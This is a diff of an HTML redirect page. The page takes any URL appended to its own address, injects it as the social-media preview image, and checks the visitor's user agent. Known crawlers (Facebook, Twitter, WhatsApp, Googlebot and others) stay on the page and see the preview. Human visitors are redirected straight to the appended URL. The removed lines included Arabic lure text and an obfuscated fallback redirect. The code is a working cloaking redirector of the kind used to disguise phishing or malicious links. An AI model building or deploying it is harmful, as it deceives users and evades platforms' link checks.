@@ -1,49 +1,28 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-
-    <!-- مكان ديناميكي لحقن الصورة للبوتات -->
     <meta id="meta-img" property="og:image" content="">
-    <meta property="og:title" content="صورة حصرية">
-    <meta property="og:description" content="اضغط للمشاهدة">
-    <meta property="og:type" content="website">
-
     <script>
-        // استخراج الرابط المستهدف من بعد الـ ? أو المسار تماماً زي ما طلبت
         const fullUrl = window.location.pathname + window.location.search + window.location.hash;
         const match = fullUrl.match(/(https?:\/\/.+)/i);
         const targetUrl = match ? decodeURIComponent(match[1]) : "";
 
         if (targetUrl) {
-            // حقن الصورة مباشرة في الـ Meta tag عشان البوت يشوفها في الـ Source
             let ogImg = document.getElementById('meta-img');
-            if (ogImg) {
-                ogImg.setAttribute('content', targetUrl);
-            }
+            if (ogImg) ogImg.setAttribute('content', targetUrl);
 
-            // فحص هل اللي فاتح بوت ولا بني آدم
             const userAgent = navigator.userAgent || "";
             const isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector/i.test(userAgent);
 
             if (!isBot) {
-                // لو إنسان، حوله فوراً للهدف
                 window.location.replace(targetUrl);
             }
-            // لو بوت، هنسيبه يقرا الـ meta tag اللي اتحدثت فوق دي
         } else {
-            // التحويل العشوائي للإنسان لو مفيش رابط
-            const a = "goog";
-            const b = ".le";
-            const c = "..com?";
-            const d = Math.ceil(Math.random() * 24);
-            window.location.replace("https://" + a + b + c + d);
+            window.location.replace("https://google.com");
         }
     </script>
 </head>
 <body>
-    <p>جارِ التحويل...</p>
 </body>
 </html>
